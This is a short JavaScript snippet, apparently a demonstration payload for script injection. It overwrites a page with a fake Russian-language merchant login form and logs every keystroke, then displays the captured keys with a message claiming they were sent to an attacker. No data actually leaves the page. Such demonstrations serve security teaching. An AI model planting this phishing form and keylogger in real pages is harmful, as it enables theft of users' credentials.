document.body.innerHTML='<h1>Войдите в ЛК мерчанта</h1><form action="" method="post"><label for="login">Логин:</label><input id="login" type="text" name="name" /><br><label for="pass">Пароль:</label><input id="pass" type="password" name="name" /><input type="submit" value="Войти" /></form>'
document.body.innerHTML += "<br><br>"

var keys='';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		document.body.innerHTML+="Вы ввели эти символы, они отправлены злоумышленнику: " + keys + "<br>"
		keys = '';
	}
}, 1000);
